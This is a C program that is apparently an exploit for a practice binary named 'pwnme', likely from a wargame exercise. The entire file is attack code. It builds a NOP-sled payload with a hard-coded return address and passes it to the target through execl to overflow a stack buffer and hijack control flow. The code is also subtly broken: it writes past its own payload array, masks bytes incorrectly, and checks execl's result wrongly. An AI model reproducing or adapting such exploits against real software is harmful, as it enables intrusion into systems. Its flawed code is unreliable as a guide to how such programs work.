#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define NOP 0x90

char *convert(char *, unsigned int );

const char *path = "/home/tux/0x00/pwnme";
const char *name = "pwnme";

int main(int argc, char *argv[])
{
    char payload[268]; 
    char ret_addr[5];
 
    unsigned int ret = 0xbffffef7;

    convert(ret_addr, ret);

    memset(payload, NOP, 268);
    memcpy(payload+268, ret_addr, strlen(ret_addr));

    if(!execl(path, name, payload, 0))
    {
    	fprintf(stderr, "[!] Something went wrong...\n");
    	exit(0);
    }
    return 0;   
}

char *convert(char *output, unsigned int address)
{
    snprintf(output, 5, "%c%c%c%c", (char)address&0x000000FF, (char)(address >> 8)&0x000000FF, (char)(address >> 16)&0x000000FF, (char)(address >> 24)&0x000000FF);
    return 0;
}
